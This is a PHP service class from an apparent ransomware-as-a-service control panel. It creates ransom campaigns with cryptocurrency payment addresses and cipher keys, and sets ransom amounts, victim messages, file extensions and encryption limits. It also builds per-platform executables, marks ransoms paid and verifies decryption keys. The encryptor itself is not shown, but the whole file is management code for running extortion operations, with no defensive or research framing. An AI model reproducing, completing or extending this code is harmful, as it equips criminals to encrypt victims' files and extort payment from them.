<?php

namespace SmallPHP\Services;

require_once __DIR__ . "/crypto_service.php";
require_once __DIR__ . "/cipher_service.php";
require_once __DIR__ . "/../models/cipher/xor_cipher.php";
require_once __DIR__ . "/../models/ransom.php";
require_once __DIR__ . "/../models/executable/architecture_type.php";
require_once __DIR__ . "/../models/executable/system_type.php";
require_once __DIR__ . "/../models/executable/executable.php";
require_once __DIR__ . "/../models/business_exceptions/resource_not_found_exception.php";

use Doctrine\ORM\EntityManager;
use SmallPHP\Models\ArchitectureType;
use SmallPHP\Models\Cipher;
use SmallPHP\Models\CipherType;
use SmallPHP\Models\CryptoType;
use SmallPHP\Models\Executable;
use SmallPHP\Models\Ransom;
use SmallPHP\Models\SystemType;
use SmallPHP\Models\XORCipher;
use SmallPHP\Models\ResourceNotFoundException;

class RansomService
{
    protected EntityManager $entity_manager;
    private CryptoService $crypto_service;
    private CipherService $cipher_service;

    public function __construct(EntityManager $entity_manager)
    {
        $this->entity_manager = $entity_manager;
        $this->crypto_service = new CryptoService();
        $this->cipher_service = new CipherService();
    }

    public function get_all_ransoms(): array
    {
        return array_map(function ($ec) { return $ec->to_full_array(); }, $this->entity_manager->getRepository(Ransom::class)->findAll());
    }

    public function create_ransom(CryptoType $crypto_id, CipherType $cipher_id): Ransom
    {
        $crypto_address = $this->crypto_service->create_crypto_address($crypto_id);
        $cipher = $this->cipher_service->create_cipher($cipher_id);

        $encrypted = new Ransom($crypto_address, $cipher);
        $encrypted->set_ransom_amount(0.3);
        $encrypted->set_message("Sorry it happened to you!");
        $encrypted->set_description("Automatically created ransom on " . date("Y-m-d H:i:s") . ".");
        $crypto_address->set_encrypted_computer($encrypted);
        $cipher->set_encrypted_computer($encrypted);

        $this->entity_manager->persist($encrypted);
        $this->entity_manager->flush();
        return $encrypted;
    }

    public function fetch_ransom(string $id): ?Ransom
    {
        $encrypted = $this->entity_manager->find(Ransom::class, $id);
        return $encrypted;
    }

    public function set_paid_ransom(string $id): ?Ransom
    {
        $encrypted = $this->entity_manager->find(Ransom::class, $id);
        if($encrypted === null)
        {
            return null;
        }
        $encrypted->set_paid(true);
        $this->entity_manager->flush();
        return $encrypted;
    }

    public function get_executables(string $id): array
    {
        $ransom = $this->entity_manager->find(Ransom::class, $id);

        if($ransom === null)
        {
            return [];
        }

        return array_map(function ($exe) { return $exe->to_array(); }, $ransom->get_executables());
    }

    public function create_executable(string $id, string $system, string $architecture): void
    {
        $ransom = $this->entity_manager->find(Ransom::class, $id);
        $architecture_type = ArchitectureType::from_string($architecture);
        $system_type = SystemType::from_string($system);

        if($ransom === null)
        {
            throw new ResourceNotFoundException("Ransom not found", 0, null);
        }

        $executable = new Executable($ransom, $architecture_type, $system_type);
        $ransom->add_executable($executable);
        $this->entity_manager->persist($executable);
        $this->entity_manager->flush();

        $executable->build();
    }

    public function get_executable(string $id, string $system, string $architecture)
    {
        // TODO: Implement
    }

    public function create_premake_ransom(array $params): Ransom
    {
        // TODO: Support given Crypto Address
        $cipher = $this->cipher_service->create_cipher(CipherType::from_string($params["cipherType"]));
        $crypto_address = $this->crypto_service->create_crypto_address(CryptoType::from_string($params["cryptoType"]));
        $ransom = new Ransom($crypto_address, $cipher);

        $ransom->set_ransom_amount($params["cryptoAmount"]);
        $ransom->set_message($params["message"]);
        $ransom->set_max_encrypt($params["maxEncrypt"]);
        $ransom->set_extension($params["extension"]);

        if(isset($params["description"]) && is_string($params["description"]))
            $ransom->set_description($params["description"]);

        if(isset($params["name"]) && is_string($params["name"]))
            $ransom->set_name($params["name"]);

        $crypto_address->set_encrypted_computer($ransom);
        $cipher->set_encrypted_computer($ransom);

        $this->entity_manager->persist($ransom);
        $this->entity_manager->flush();
        return $ransom;
    }

    public function check_key_for_id(string $id, string $key): bool
    {
        $encrypted = $this->entity_manager->find(Ransom::class, $id);

        if ($encrypted === null)
            return false;

        return $encrypted->get_cipher()->get_decryption_key() === $key;
    }

    public function delete_ransom(int $id): bool
    {
        $encrypted = $this->entity_manager->find(Ransom::class, $id);

        if ($encrypted === null)
            return false;

        $this->entity_manager->remove($encrypted);
        $this->entity_manager->flush();
        return true;
    }

    public function update_ransom(Ransom $ransom, array $to_edit)
    {
        if(isset($to_edit["name"]) && is_string($to_edit["name"]))
            $ransom->set_name($to_edit["name"]);

        if(isset($to_edit["message"]) && is_string($to_edit["message"]))
            $ransom->set_message($to_edit["message"]);

        if(isset($to_edit["description"]) && is_string($to_edit["description"]))
            $ransom->set_description($to_edit["description"]);

        if(isset($to_edit["paid"]) && is_bool($to_edit["paid"]))
            $ransom->set_paid($to_edit["paid"]);

        if(isset($to_edit["ransom_amount"]) && is_float($to_edit["ransom_amount"]))
            $ransom->set_ransom_amount($to_edit["ransom_amount"]);

        $this->entity_manager->persist($ransom);
        $this->entity_manager->flush();
    }
}
